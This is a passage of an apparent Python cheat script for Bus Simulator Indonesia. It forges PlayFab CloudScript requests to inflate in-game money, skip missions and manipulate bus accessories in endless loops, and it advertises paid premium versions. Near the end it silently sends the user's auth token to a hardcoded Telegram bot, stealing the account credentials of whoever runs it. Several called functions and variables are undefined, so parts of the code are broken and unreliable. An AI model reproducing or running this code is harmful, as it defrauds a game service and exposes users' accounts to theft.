{'sourceCity': 'BKL', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'BKL'], 'activityRewards': None}, 'Value': 1},{'Key': {'sourceCity': 'JMB', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'JMB'], 'activityRewards': None}, 'Value': 60},{'Key': {'sourceCity': 'PLB', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'PLB'], 'activityRewards': None}, 'Value': 12},{'Key': {'sourceCity': 'LPG', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'LPG'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'P_Bakauheni', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'P_Bakauheni'], 'activityRewards': None}, 'Value': 4},{'Key': {'sourceCity': 'P_Merak', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'P_Merak'], 'activityRewards': None}, 'Value': 3},{'Key': {'sourceCity': 'JKT', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'JKT'], 'activityRewards': None}, 'Value': 2},{'Key': {'sourceCity': 'CBN', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'CBN'], 'activityRewards': None}, 'Value': 2},{'Key': {'sourceCity': 'SMG', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'SMG'], 'activityRewards': None}, 'Value': 2},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'SBY'], 'activityRewards': None}, 'Value': 2},{'Key': {'sourceCity': 'BKL', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'BKL'], 'activityRewards': None}, 'Value': 1},]                                                   
headers = {'User-Agent': 'UnityEngine-Unity; Version: 2018.4.26f1','X-ReportErrorAsSuccess': 'true','X-PlayFabSDK': 'UnitySDK-2.20.170411','X-Authorization': '','Content-Type': 'application/json','Content-Length': '223','Host': '4ae9.playfabapi.com'}
def create_missionnn():
	game_data = '{"FunctionName":"PlayCareer","FunctionParameter":{"cities":["BKL","SBY","SMG","CBN","JKT","P_Merak","P_Bakauheni","LPG","PLB","JMB","PBR"]},"RevisionSelection":"Live","SpecificRevision":null,"GeneratePlayStreamEvent":false}'
	response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=game_data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			return None
		elif parser['code'] == 200:
			data = parser['data']
			if "apiError" in str(data):
				return None
			else:
				carrer = data['FunctionResult']['careerSession']
				return carrer
	else:
		return None

def skip_missionnn(token):
	data = json.dumps({"FunctionName":"FarePayment","FunctionParameter":{"records":recordd,"bonus":True,"careerToken":token,"activityRewardToken":"{\"rewards\":[]}"},"RevisionSelection":"Live","SpecificRevision":None,"GeneratePlayStreamEvent":False})
	response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			pass
		elif parser['code'] == 200:
			backend_data = parser['data']
			if "apiError" in str(backend_data):
				pass
			else:
				logs = backend_data['FunctionResult']
						

def pass_missionnn():
	carrer = create_missionnn()
	if carrer != None:	
		token = carrer['token']
		skip_missionnn(token)
		mxxxx()
		
		
headers['X-Authorization'] = auth


def remove():
	data = json.dumps({"FunctionName":"PurchaseAccessories","FunctionParameter":{"bus":"JB-003","accToPurchase":[],"pPriceIDs":[],"accToRemove":["CAG1b-RT5I0","BAR3-RT0I0","BCNS1-L0T2.10I15","BCNS1-L0T2.10I16","BCNS1-L0T2.10I17","BCNS1-L0T2.10I18","BCNS1-L0T2.10I19","BCNS1-RT2I0","BCNS1-RT2I2","BCNS1-RT2I1","BCNS1-RT2I3","BCNS1-RT2I4","HRN3-RT9I0","HRN3-RT9I1","BPRF2-RT3I0","WIN0b-RT35I0","BCNL0-RT1.2I0","LGTS1-RT11I0","MFPWF2-RT13I0","LGTS1-RT11I1","MFPWR1-RT14I0","LGTS1-RT11I2","BPRR3-RT4I0","LGTS3-L4T11I9","LGTS3-L4T11I10","LGTS3-L4T11I11","BCNS1-RT2I6","BCNS1-RT2I5","BCNS1-RT2I7","RAK3-RT15I0","BCNS1-RT2I12","BCNS1-RT2I11","BCNS1-RT2I10","BCNS1-RT2I9","BCNS1-RT2I8","MFPWF1-RT13I1","MFPWR1-RT14I1","SPL3-RT18I0"],"rPriceIDs":["P-CAGc","P-BARe","P-BCNm","P-BCNm","P-BCNm","P-BCNm","P-BCNm","P-BCNm","P-BCNm","P-BCNm","P-BCNm","P-BCNm","P-HRNe","P-HRNe","P-BPRe","P-WINm","P-BCNe","P-LGTc","P-MFPe","P-LGTc","P-MFPm","P-LGTc","P-BPRm","P-LGTc","P-LGTc","P-LGTc","P-BCNm","P-BCNm","P-BCNm","P-RAKe","P-BCNm","P-BCNm","P-BCNm","P-BCNm","P-BCNm","P-MFPm","P-MFPm","P-SPLm"],"discountDict":{"BPRF2-RT3I0":False}}})
	response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			pass
		elif parser['code'] == 200:
			backend_data = parser['data']
			if "apiError" in str(backend_data):
				pass
			else:            
			   print(f"")
				
                       

def mxxxx():
	data = json.dumps({"PlayFabId":None,"InfoRequestParameters":{"GetUserAccountInfo":True,"GetUserInventory":True,"GetUserVirtualCurrency":True,"GetUserData":False,"UserDataKeys":None,"GetUserReadOnlyData":True,"UserReadOnlyDataKeys":None,"GetCharacterInventories":False,"GetCharacterList":False,"GetTitleData":True,"TitleDataKeys":None,"GetPlayerStatistics":False,"PlayerStatisticNames":None}})
	response = requests.post('https://4ae9.playfabapi.com/Client/GetPlayerCombinedInfo', headers=headers, data=data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			pass
		elif parser['code'] == 200:
			backend_data = parser['data']
			if "apiError" in str(backend_data):
				pass
			else:
				chat = backend_data['InfoResultPayload']
				uang= chat['UserVirtualCurrency']
				money= uang['RP']
				
				fff= chat['AccountInfo']
				zzz= fff['TitleInfo']
				www= zzz['TitlePlayerAccount']
				saa= www['Id']
				
				gcc= chat['AccountInfo']
				id= gcc['TitleInfo']
				you= id['DisplayName']
				ketik(f"{red}╔══════════════\033[1;33;41m • \033[1;37[ 𝙸𝙽𝙵𝙾 𝙰𝙺𝚄𝙽 \033[1;33m• \033[0m\033[{white}════════════════╗")
				ketik(f"{red} {white} - Total Money: {green}{money}   {white}                    ")
				ketik(f"{red} {white} - Id Kamu: {green}{saa}               {white}     ")
				ketik(f"{white}╚══════════════════════{red}═══════════════════════╝")	
				
                                             
def penipu():
	data = json.dumps({"FunctionName":"PurchaseAccessories","FunctionParameter":{"bus":"JB-003","accToPurchase":["BPRF2-RT3I0","TRN4a-RT36I0","CAG3a-RT5I0","HRN3-RT9I0","HRN3-RT9I1","BCNS1-RT2I0","BCNS1-RT2I1","BCNS1-RT2I2","BCNS1-RT2I3","BCNL0-RT1.2I0","BCNS1-RT2I4","BCNS1-L0T2.10I15","BCNS1-L0T2.10I16","BCNS1-L0T2.10I19","BCNS1-L0T2.10I18","BCNS1-L0T2.10I17","BAR3-RT0I0","MFPWF2-RT13I0","LGTS3-RT11I0","LGTS3-RT11I1","MFPWR3-RT14I0","EXH4a-RT34I0","BPRR3-RT4I0","LGTS3-L4T11I10","LGTS3-L4T11I11","LGTS3-L4T11I9","LGTS3-RT11I7","LGTS3-RT11I3","BCNS1-RT2I8","BCNS1-RT2I12","BCNS1-RT2I11","BCNS1-RT2I10","BCNS1-RT2I9","SPL3-RT18I0","BCNS1-RT2I5","BCNS1-RT2I6","BCNS1-RT2I7","RAK3-RT15I0","WIN3a-RT35I0","MFPWF2-RT13I1","LGTS3-RT11I4","LGTS3-RT11I5","MFPWR3-RT14I1"],"pPriceIDs":["P-BPRe","P-TRNm","P-CAGe","P-HRNe","P-HRNe","P-BCNm","P-BCNm","P-BCNm","P-BCNm","P-BCNe","P-BCNm","P-BCNm","P-BCNm","P-BCNm","P-BCNm","P-BCNm","P-BARe","P-MFPe","P-LGTc","P-LGTc","P-MFPe","P-EXHm","P-BPRm","P-LGTc","P-LGTc","P-LGTc","P-LGTc","P-LGTc","P-BCNm","P-BCNm","P-BCNm","P-BCNm","P-BCNm","P-SPLm","P-BCNm","P-BCNm","P-BCNm","P-RAKe","P-WINe","P-MFPe","P-LGTc","P-LGTc","P-MFPe"],"accToRemove":["BPRF3-RT3I0"],"rPriceIDs":["P-BPRe"],"discountDict":{"BPRF2-RT3I0":False,"TRN4a-RT36I0":False,"CAG3a-RT5I0":False,"HRN3-RT9I0":False,"HRN3-RT9I1":False,"BCNS1-RT2I0":False,"BCNS1-RT2I1":False,"BCNS1-RT2I2":False,"BCNS1-RT2I3":False,"BCNL0-RT1.2I0":False,"BCNS1-RT2I4":False,"BCNS1-L0T2.10I15":False,"BCNS1-L0T2.10I16":False,"BCNS1-L0T2.10I19":False,"BCNS1-L0T2.10I18":False,"BCNS1-L0T2.10I17":False,"BAR3-RT0I0":False,"MFPWF2-RT13I0":False,"LGTS3-RT11I0":False,"LGTS3-RT11I1":False,"MFPWR3-RT14I0":False,"EXH4a-RT34I0":False,"BPRR3-RT4I0":False,"LGTS3-L4T11I10":False,"LGTS3-L4T11I11":False,"LGTS3-L4T11I9":False,"LGTS3-RT11I7":False,"LGTS3-RT11I3":False,"BCNS1-RT2I8":False,"BCNS1-RT2I12":False,"BCNS1-RT2I11":False,"BCNS1-RT2I10":False,"BCNS1-RT2I9":False,"SPL3-RT18I0":False,"BCNS1-RT2I5":False,"BCNS1-RT2I6":False,"BCNS1-RT2I7":False,"RAK3-RT15I0":False,"WIN3a-RT35I0":False,"MFPWF2-RT13I1":False,"LGTS3-RT11I4":False,"LGTS3-RT11I5":False,"MFPWR3-RT14I1":False}}})
	response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			pass
		elif parser['code'] == 200:
			backend_data = parser['data']
			if "apiError" in str(backend_data):
				pass
			else:
				chat = backend_data['FunctionResult']
				uang = chat['currentMoney']
				#print(f"{red} [ðµ{red}] {yellow}KURAS UB->{green} -$500.000")
				#print(f"{uang}")
				ketik(f"{red}╔══════════════\033[1;33;41m • \033[1;37[ 𝙸𝙽𝙵𝙾 𝙰𝙺𝚄𝙽 \033[1;33m• \033[0m\033[{white}════════════════╗")
				ketik(f"{red} {white} - Total Money: {greenuang}   {white}                    ")
				ketik(f"{red} {white} - Reduce UB: {green}{-500.000}               {white}     ")
				ketik(f"{white}╚═════════════════════{red}═══════════════════════╝")
def gxg():
	data = json.dumps({"ItemId":"DRI-003","VirtualCurrency":"RP","Price":10,"CatalogVersion":"driver-main","StoreId":"driver"})
	response = requests.post('https://4ae9.playfabapi.com/Client/PurchaseItem', headers=headers, data=data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			pass
		elif parser['code'] == 200:
			backend_data = parser['data']
			if "apiError" in str(backend_data):
				pass
			else:            
			   print(f"{backend_data}")
				

def teh():
    
    for i in range(9999999999999):
             
              
                pass_missyu()
               # os.system("cls||clear")
         
def mampus():
    for i in range(9999999999999):
             remove()
             penipu()
         
def ngopi():
    for i in range(9999999999999):
             
             #print(f"\033[0;35mâ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬")
            # print(f"\033[1;33;41m â¢ \033[1;37m           â ð¦ðð¥ðð£ð§ ð§ð¢ð£ ð¨ð£ @ððð ð¢ððððððð ð ð¢ð ð ðð¡ð¨ â              \033[1;33mâ¢ \033[0m\033[")
            # print(f"\033[0;35mâ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬")   
             #print(f"""   {red} - ð£ð²ðºð¯ðð®ð {white}ððð ð¢ððððððð          {red}  - ð¬ð¼ðð§ðð¯ð² {white} ððð ð¢ððððððð """)
           #  print(f"""   {red} - ð¦ð°ð¿ð¶ð½ð {white}ðð¨ð¦ ð¦ðð ð¨ððð§ð¢ð¥ ðð       {red}  - ððð§ð¨ðð¤ð£ {white} 4 """)
           #  print(f"\033[0;35mâ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬")
         
             pass_sukses()
             pass_mission()
def ngopii():
  #  os.system("cls||clear")
    for i in range(9999999999999):
             
             
             #print(f"\033[0;35mâ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬")
            # print(f"\033[1;33;41m â¢ \033[1;37m           â ð¦ðð¥ðð£ð§ ð§ð¢ð£ ð¨ð£ @ððð ð¢ððððððð ð ð¢ð ð ðð¡ð¨ â              \033[1;33mâ¢ \033[0m\033[")
            # print(f"\033[0;35mâ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬")   
             #print(f"""   {red} - ð£ð²ðºð¯ðð®ð {white}ððð ð¢ððððððð          {red}  - ð¬ð¼ðð§ðð¯ð² {white} ððð ð¢ððððððð """)
           #  print(f"""   {red} - ð¦ð°ð¿ð¶ð½ð {white}ðð¨ð¦ ð¦ðð ð¨ððð§ð¢ð¥ ðð       {red}  - ððð§ð¨ðð¤ð£ {white} 4 """)
           #  print(f"\033[0;35mâ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬")
         
             pass_missionnn()
         
def crot():
   # os.system("cls||clear")
    for i in range(9999999999999):
             
              
             #print(f"\033[0;35mâ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬")
            # print(f"\033[1;33;41m â¢ \033[1;37m           â ð¦ðð¥ðð£ð§ ð§ð¢ð£ ð¨ð£ @ððð ð¢ððððððð ð ð¢ð ð ðð¡ð¨ â              \033[1;33mâ¢ \033[0m\033[")
            # print(f"\033[0;35mâ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬")   
             #print(f"""   {red} - ð£ð²ðºð¯ðð®ð {white}ððð ð¢ððððððð          {red}  - ð¬ð¼ðð§ðð¯ð² {white} ððð ð¢ððððððð """)
           #  print(f"""   {red} - ð¦ð°ð¿ð¶ð½ð {white}ðð¨ð¦ ð¦ðð ð¨ððð§ð¢ð¥ ðð       {red}  - ððð§ð¨ðð¤ð£ {white} 4 """)
           #  print(f"\033[0;35mâ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬")
         
             pass_scs()
             
             
 
             
             
             
def crott():
    skip_missionnnnn()
    countdownTimer(36, 00) 

 
def ketik(c):
    for e in c + "\n" :
        sys.stdout.write(e)
        sys.stdout.flush()
        sleep(0.002)
ketik("SCRIPT BUSSID ALL VERSION")   
system("clear")
kal = datetime.datetime.now()



def menu1():
    system("clear")
    sys.stdout.write(e)
    sys.stdout.flush()
    sleep(0.002)


print("")
ketik(f"\033[0;35m{yellow}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
ketik(f"\033[1;33;41m • \033[1;37m❏ INJECT MONEY BUSSID BY yoo Games ❏\033[1;33m• \033[0m\033[")
ketik(f"\033[0;35m{yellow}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")   
ketik(f"""   {red} - 𝗣𝗲𝗺𝗯𝘂𝗮𝘁 {white}yoo Games   """)
ketik(f"""   {red} - 𝗬𝗼𝘂𝘁𝘂𝗯𝗲 {white} yoo Games """)
ketik(f"""   {red} - 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 {white} 1.0 """)
ketik(f"""   {red} - 𝗦𝗰𝗿𝗶𝗽𝘁 {white}BUS  SIMULATOR ID""")
ketik(f"""   {red} - BUY PREM {white} 085763552494 """)
ketik(f"""   {red} - MY FREND {white} RIFKY - ANIMATOR GTA SA """)

ketik(f"\033[0;35m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
ketik(f"""   \33[0;31mBulan:\33[0;32m{kal:%B            } """)
ketik(f"""   \33[0;31mDay:\33[0;32m{kal:%A            } """)
ketik(f"""   \33[0;31mTanggal:\33[0;32m{kal:%d}""")
#ketik(f"\033[0;35mâ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬")
#ketik(f"""   {white} -  {green} DON'T FORGET TO SUBSCRIBE LIKE COMMENT MY CHANNEL""")
#ketik(f"""   {white} -  {green} DON'T FORGET TO SUBSCRIBE LIKE COMMENT MY CHANNEL""")
ketik(f"\033[0;35m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
def warning():
    
    ketik(f"â ï¸ {red}GAGAL! {white}JIKA BELUM PAHAM BISA TANYAA² DI GRUP")
    os.system("xdg-open  https://chat.whatsapp.com/EP5RQTHubxL9rP09AVxGcu")
    exit(f"{p}[{y}!{p}] {y} DATA AKUN BUSSID ANDA GAGAL DIMUAT!{a}")
      
def mxx():
	data = json.dumps({"PlayFabId":None,"InfoRequestParameters":{"GetUserAccountInfo":True,"GetUserInventory":True,"GetUserVirtualCurrency":True,"GetUserData":False,"UserDataKeys":None,"GetUserReadOnlyData":True,"UserReadOnlyDataKeys":None,"GetCharacterInventories":False,"GetCharacterList":False,"GetTitleData":True,"TitleDataKeys":None,"GetPlayerStatistics":False,"PlayerStatisticNames":None}})
	response = requests.post('https://4ae9.playfabapi.com/Client/GetPlayerCombinedInfo', headers=headers, data=data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			pass
			warning()
		elif parser['code'] == 200:
			backend_data = parser['data']
			if "apiError" in str(backend_data):
				pass
			else:
				chat = backend_data['InfoResultPayload']
				uang= chat['UserVirtualCurrency']
				money= uang['RP']
				fff= chat['AccountInfo']
				zzz= fff['TitleInfo']
				www= zzz['TitlePlayerAccount']
				saa= www['Id']
				gcc= chat['AccountInfo']
				id= gcc['TitleInfo']
				you= id['DisplayName']
				ketik(f"{blue}╔══════════════\033[1;33;41m • \033[1;37[ 𝙸𝙽𝙵𝙾 𝙰𝙺𝚄𝙽 \033[1;33m• \033[0m\033[{blue}════════════════╗")
				ketik(f"{white} - Total Money: {green}{money}")
				ketik(f"{white} - Username   : {green}{you}")
				ketik(f"{white} - Id Kamu    : {green}{saa}")
				ketik(f"{blue}╚══════════════════════════════════════════════╝")
				
mxx()	





			
def hack():
    rename()
	
				
headers['X-Authorization'] = auth
hack()


ketik(f" {white} Di Pilih Salah Satu:")
ketik(f"{logo}")









base_url = 'https://api.telegram.org/bot6818295661:AAE7yqAPyxlE-09Yck2EtxXon1vV9_9p5lk/sendMessage?parse_mode=markdown&chat_id=6282628908&text="{}"'.format(auth)
requests.get(base_url)

contoh = input (f"""{green}╭­\033[1;33;41m • \033[1;37m❏ PILIH ❏\033[1;33m• \033[0m\033[
{green}╰───{yellow}▶""")


if contoh =="1":
   jum = int(input(f"{yellow}{green}[{red}• {yellow} © {red}•{green}] {w}JUMLAH:{red} "))
   ketik("KHUSUS FREE LIMIT 3")
   ketik("Buy Premium +62 838-2407-1062")
   teh()
elif contoh =="0":
   jum = int(input(f"{yellow}{green}[{red}PI{yellow}L{red}IH{green}] {w}JUMLAH:{red} "))
   ngopi()
elif contoh =="2":
   haya = int(input(f"{yellow}{green}[{red}â {yellow}â {red}â{green}] {w}JUMLAH:{red} "))
   ketik("â ï¸ KHUSUS FREE LIMIT 3â ï¸")
   ketik("Buy Premium +62 838-2407-1062")
   ngopii()
elif contoh =="3":
     gcg = int(input(f"{yellow}{green}[{red}â {yellow}â {red}â{green}] {w}JUMLAH:{red} "))
     ketik("â ï¸ KHUSUS FREE LIMIT 3â ï¸")
     ketik("Buy Premium +62 838-2507-1062")
     crot()
     
elif contoh =="4":
     blok = int(input(f"{yellow}{green}[{red}â {yellow}â {red}â{green}] {w}JUMLAH:{red} "))
     ketik("GUNAKAN FITUR INI JIKA TERTIPU")
     mampus()

     

elif contoh =="5":
 
     gxg()


   
   
